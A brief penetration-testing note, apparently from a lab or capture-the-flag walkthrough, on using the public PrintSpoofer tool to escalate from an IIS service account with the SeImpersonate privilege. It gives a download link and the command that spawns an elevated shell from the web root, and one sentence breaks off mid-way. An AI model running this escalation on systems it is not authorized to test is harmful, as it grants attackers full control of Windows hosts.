### Printerspoofer
[Printspoofer](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)  
exploits a vulnerability in Windows where certain service accounts are required to run with elevated privileges utilizing the * SeImpersonate * privilege. We see that we are the iis apppool\defaultapppool service account user, which
Download 
https://github.com/dievus/printspoofer

Go to directory that prointspoofer is uploaded to (C:\inetpub\wwwroot\<share>)
```
cd C:\inetpub\wwwroot\
PrintSpoofer.exe -i -c cmd
```